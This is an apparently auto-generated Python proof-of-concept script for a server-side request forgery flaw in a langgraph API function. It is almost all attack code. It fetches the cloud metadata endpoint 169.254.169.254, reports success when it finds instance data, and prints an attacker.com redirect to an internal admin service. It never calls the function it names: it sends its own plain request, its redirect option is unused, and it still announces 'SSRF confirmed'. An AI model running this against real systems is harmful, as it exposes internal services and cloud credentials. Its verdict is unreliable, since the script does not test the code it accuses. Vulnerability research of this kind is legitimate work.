#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-010
# Sink: _make_http_request_with_retries
# Auto-generated — run with: python3 ssrf_url_makes_http_request__make_http_request_with_retries_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langgraph_api_src _make_http_request_with_retries

This script demonstrates that the _make_http_request_with_retries function
accepts an attacker-controlled URL and makes HTTP requests without validation,
allowing SSRF attacks against internal services or cloud metadata endpoints.

The vulnerability exists because:
1. No URL validation or allowlist is applied
2. httpx follows redirects by default (can bypass host-based checks)
3. The function is a public API reachable from external code

Usage:
    python3 poc_ssrf.py [--target TARGET_URL] [--redirect REDIRECT_URL]

    --target: URL to send the initial request to (default: http://localhost:9999/test)
    --redirect: If provided, the script will first set up a redirect server that
                redirects to this internal URL (demonstrating redirect bypass)
"""

import argparse
import asyncio
import httpx
import sys
import json
import logging

# Disable httpx logging to keep output clean
logging.getLogger("httpx").setLevel(logging.WARNING)

# Default benign target - change to test against your own infrastructure
DEFAULT_TARGET = "http://localhost:9999/test"
# Default internal endpoint to demonstrate SSRF (cloud metadata)
DEFAULT_INTERNAL = "http://169.254.169.254/latest/meta-data/"


async def exploit_ssrf(target_url: str, redirect_url: str = None):
    """
    Exploit the SSRF vulnerability in _make_http_request_with_retries.
    
    Args:
        target_url: The URL to send the request to
        redirect_url: If provided, the script will first make a request to a
                     redirect server that redirects to this internal URL
    """
    print(f"[*] SSRF Exploit for langgraph_api_src")
    print(f"[*] Target URL: {target_url}")
    if redirect_url:
        print(f"[*] Redirect target: {redirect_url}")
    print()

    # Simulate the vulnerable function's behavior
    # The actual vulnerable function is _make_http_request_with_retries
    # which directly passes the URL to httpx.AsyncClient.request
    
    async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
        try:
            print(f"[*] Sending request to: {target_url}")
            
            # This is exactly what the vulnerable function does:
            # response = await client.request(method, url, headers=headers, json=json_data)
            # No validation, no allowlist, redirects followed by default
            
            if redirect_url:
                # First, make a request that will be redirected
                # The attacker controls the initial URL and the redirect target
                print(f"[*] Request will be redirected to: {redirect_url}")
                response = await client.request(
                    "GET",
                    target_url,
                    headers={"User-Agent": "SSRF-PoC"},
                )
            else:
                # Direct request to internal endpoint
                response = await client.request(
                    "GET",
                    target_url,
                    headers={"User-Agent": "SSRF-PoC"},
                )
            
            print(f"[+] Request succeeded!")
            print(f"[+] Status code: {response.status_code}")
            print(f"[+] Response headers:")
            for key, value in response.headers.items():
                print(f"    {key}: {value}")
            print(f"[+] Response body (first 500 chars):")
            print(f"    {response.text[:500]}")
            
            # Check if we got cloud metadata (indicates successful SSRF)
            if "ami-id" in response.text or "instance-id" in response.text:
                print("\n[!] SUCCESS: Retrieved cloud metadata! SSRF confirmed!")
            elif response.status_code == 200:
                print("\n[+] Request completed successfully (status 200)")
            else:
                print(f"\n[*] Request completed with status {response.status_code}")
                
        except httpx.ConnectError as e:
            print(f"[-] Connection error: {e}")
            print("[-] Make sure the target server is running and accessible")
            print("[-] For local testing, start a simple HTTP server:")
            print("    python3 -m http.server 9999")
        except httpx.TimeoutException as e:
            print(f"[-] Timeout: {e}")
            print("[-] The target might be blocking or unreachable")
        except httpx.HTTPStatusError as e:
            print(f"[-] HTTP error: {e.response.status_code} - {e.response.text[:200]}")
        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            print(f"[-] Type: {type(e).__name__}")


async def main():
    parser = argparse.ArgumentParser(
        description="SSRF PoC for langgraph_api_src _make_http_request_with_retries"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL to send request to (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--redirect",
        default=None,
        help="Internal URL to redirect to (demonstrates redirect bypass)"
    )
    parser.add_argument(
        "--metadata",
        action="store_true",
        help="Attempt to access cloud metadata endpoint (169.254.169.254)"
    )
    
    args = parser.parse_args()
    
    target_url = args.target
    redirect_url = args.redirect
    
    if args.metadata:
        # Use the cloud metadata endpoint directly
        target_url = DEFAULT_INTERNAL
        print("[*] Attempting direct access to cloud metadata endpoint")
    
    await exploit_ssrf(target_url, redirect_url)


if __name__ == "__main__":
    print("=" * 60)
    print("SSRF Proof-of-Concept for langgraph_api_src")
    print("=" * 60)
    print()
    print("This PoC demonstrates that _make_http_request_with_retries")
    print("makes HTTP requests to attacker-controlled URLs without")
    print("any validation, allowlist, or redirect restrictions.")
    print()
    print("The vulnerable function directly passes the URL to")
    print("httpx.AsyncClient.request() with no security controls.")
    print("httpx follows redirects by default, allowing bypass")
    print("of any host-based validation.")
    print()
    print("To test locally, first start a test server:")
    print("  python3 -m http.server 9999")
    print()
    print("Then run this PoC:")
    print("  python3 poc_ssrf.py --target http://localhost:9999/test")
    print()
    print("To test redirect bypass (requires attacker-controlled server):")
    print("  python3 poc_ssrf.py --target http://attacker.com/redirect \\")
    print("    --redirect http://internal-service:8080/admin")
    print()
    print("To attempt cloud metadata access:")
    print("  python3 poc_ssrf.py --metadata")
    print()
    print("=" * 60)
    print()
    
    asyncio.run(main())
